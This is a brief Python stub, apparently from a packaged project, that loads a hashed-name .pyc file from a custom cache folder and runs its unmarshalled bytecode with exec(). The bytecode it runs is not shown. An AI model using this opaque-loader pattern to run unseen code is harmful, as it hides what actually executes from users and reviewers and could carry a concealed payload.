
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'CustomRecommendedMenu_0302649741be412ab28615dc7bec56ec.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
